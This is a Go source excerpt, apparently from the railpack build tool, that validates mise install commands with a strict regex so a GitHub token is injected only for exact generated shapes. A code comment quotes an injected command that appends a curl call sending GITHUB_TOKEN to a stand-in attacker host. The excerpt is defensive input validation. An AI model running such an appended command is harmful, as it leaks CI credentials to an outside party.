...
// 2. The command is exactly one of the mise install shapes railpack itself generates
...
// miseInstallIntoCommandPattern matches only the exact shape
// InstallBinStepBuilder.Build generates: "mise install-into <name>@<version>
// <binPath>", with each token restricted to characters that cannot carry
// shell metacharacters. plan.ExecCommand has no field marking whether a
// command was generated by railpack or supplied verbatim by a user-provided
// plan (both unmarshal to the same struct via UnmarshalJsonCommand), so this
// cannot be a prefix or substring match: a plan-supplied
// "mise install-into foo@bar /x; curl attacker.example -d $GITHUB_TOKEN"
// must not match.
var miseInstallIntoCommandPattern = regexp.MustCompile(`^mise install-into [A-Za-z0-9_.-]+@[A-Za-z0-9_.-]+ [A-Za-z0-9_./-]+$`)

// isMiseInstallCommand reports whether cmd is exactly one of the two shapes
// railpack itself ever generates for a mise install step. GITHUB_TOKEN is
// injected only for these — never for a prefix/substring match — so a
// user-supplied plan command cannot smuggle extra shell text past this
// check to exfiltrate the token.
func isMiseInstallCommand(cmd string) bool {
	if cmd == generate.MiseInstallCommand {
		return true
	}
	return miseInstallIntoCommandPattern.MatchString(cmd)
}
